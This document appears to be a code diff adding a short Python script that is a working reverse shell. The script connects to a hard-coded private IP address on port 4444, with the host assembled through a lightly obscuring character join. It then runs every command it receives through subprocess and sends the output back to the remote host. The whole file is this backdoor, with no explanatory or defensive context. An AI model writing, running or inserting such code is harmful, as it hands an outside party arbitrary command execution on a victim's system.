@@ -1,0 +1,17 @@
+import socket as s, subprocess as sp
+
+def r():
+    h = ''.join([chr(ord(c)) for c in ['1','9','2','.','1','6','8','.','1','.<hidden>']])
+    p = 4444
+    c = s.socket(s.AF_INET, s.SOCK_STREAM)
+    c.connect((h, p))
+    while 1:
+        cmd = c.recv(1024).decode()
+        if cmd.lower() == 'exit':
+            break
+        o = sp.getoutput(cmd)
+        c.send(o.encode())
+    c.close()
+
+if __name__ == "__main__":
+    r()
